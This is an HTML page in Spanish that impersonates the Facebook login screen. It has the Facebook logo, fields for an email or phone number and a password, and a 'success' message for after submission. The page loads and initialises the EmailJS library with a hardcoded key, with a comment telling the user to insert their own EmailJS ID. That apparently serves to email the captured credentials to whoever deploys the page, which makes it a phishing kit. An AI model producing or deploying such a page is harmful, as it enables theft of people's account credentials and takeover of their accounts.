<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
    (function () {
        emailjs.init("UzTwu5OwgaZLOgPA5"); // Reemplaza con tu User ID de EmailJS
    })();
</script>
<body>
    <div class="container">
        <div class="logo">
            <img src="logo.svg" alt="Facebook Logo">
        </div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div id="errorMessage" class="error-message"></div>
        <div id="successMessage" class="success-message">
            <div class="success-icon">✓</div>
            <div class="success-text">Exitoso</div>
        </div>
        <div class="links">
            <a href="#">¿Olvidaste tu contraseña?</a>
            <a href="#">Crear cuenta nueva</a>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
